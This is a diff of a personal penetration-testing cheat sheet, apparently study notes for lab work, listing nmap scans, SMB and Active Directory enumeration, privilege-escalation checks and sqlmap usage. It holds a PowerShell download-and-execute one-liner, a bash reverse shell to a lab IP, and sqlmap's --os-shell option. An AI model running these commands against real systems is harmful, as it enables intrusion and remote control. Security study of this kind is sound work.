@@ -2,7 +2,7 @@
 sudo nmap -O -sS -p- "$target"
 sudo nmap -sU -p- "$target"
 sudo nmap -sC -sV "$target"
-sudo nmap -O -sS -p- "$target" | tee synscan.txt && sudo nmap -sC -sV "$target" | tee scriptscan.txt && sudo nmap -sU -p- "$target" | tee udpscan.txt
+sudo nmap -O -sS -p- target -oA nmap/synscan && sudo nmap -sC -sV target -oA nmap/scriptscan && sudo nmap -sU -p- target -oA nmap/udpscan
 
 # Sudo
 sudo -l
@@ -19,14 +19,17 @@ nmap -v -p 139,445 --script=smb-vuln-* "$target"
 enum4linux -o "$target" -k none
 smblcient -L "$target"
 smbclient \\\\$target\\WORSPACE
+smbmap -H target -u 0xdf -p 0xdf
 
 # Upgrading Shell (pty)
 python -c 'import pty; pty.spawn("/bin/bash")'
 script /dev/null
 
 # Powershell
-powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://self/file')
+iex(new-object net.webclient).downloadstring("http://self/file")
 Also check out 16.2.3 for base64 executable transfer and execution
+
 
 # Windows Priv Esc
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
@@ -53,3 +56,33 @@ gcc -o outfile.so -shared infile.c -fPIC
 
 # Reverse Shell
 bash -i >& /dev/tcp/192.168.119.194/8000 0>&1
+
+# John the ripper
+zip2john # extract hahs for john from protected zip file (also rar2john)
+
+# Impacket
+GetNPUsers.py # userful for AD attacks looking for user creds
+
+# Active Directory AD
+evil-winrm.rb -i target -u username -p password
+bloodhound-python
+
+# RPC
+rpccliet -U "" -N target
+
+# DNS
+dig @target ip
+nslookup
+> server target
+dig axfr target # zone transfer
+
+## Enumeration
+enumdonusers
+enumdomgroups
+querygroup <groupnumber>
+
+# Misc Tools Yet to be tried (binwalk|sqlmap)
+binwalk - find hidden parts in binary files (e.g. .tar hidden in an .jpg)
+sqlmap - look for injections -- sqlmap -u 'http://target/dashboard.php?search=any+query' --cookie="PHPSESSID=3bqvp5sdfgobdcipjs24fkdvg2"
+- Also try with the `--os-shell` flag
+
